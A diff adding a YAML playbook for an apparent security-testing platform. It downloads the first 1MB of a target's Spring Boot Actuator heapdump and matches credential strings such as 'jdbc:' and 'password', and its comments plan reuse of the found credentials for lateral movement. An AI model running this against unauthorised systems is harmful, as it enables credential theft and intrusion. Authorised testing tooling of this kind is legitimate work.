@@ -1,0 +1,17 @@
+# 剧本：Actuator heapdump 凭据线索提取（Range 限 1MB，只读）
+# 服务模板：actuator_heapdump / chain_heapdump_to_lateral
+# 判据：下载首 1MB 命中 jdbc:/password 等凭据特征 → 证实；横向复用走 save_db_credential + 只读验证
+id: actuator_heapdump_creds
+name: Actuator heapdump 凭据线索
+refuted_status_in: [401, 403, 404]
+steps:
+  - name: heapdump_head
+    request:
+      method: GET
+      url: "https://{{host}}/actuator/heapdump"
+      headers: { Range: "bytes=0-1048575" }
+    expect:
+      status_in: [200, 206]
+      contains_any: ["jdbc:", "password", "secret", "jdbc:mysql", "jdbc:postgresql"]
+limits: { max_requests: 2, per_step_timeout_ms: 15000 }
+note: 堆转储属敏感证据——只保留首 1MB 特征命中，完整 dump 不落平台磁盘；提取到的凭据走凭据池流程。
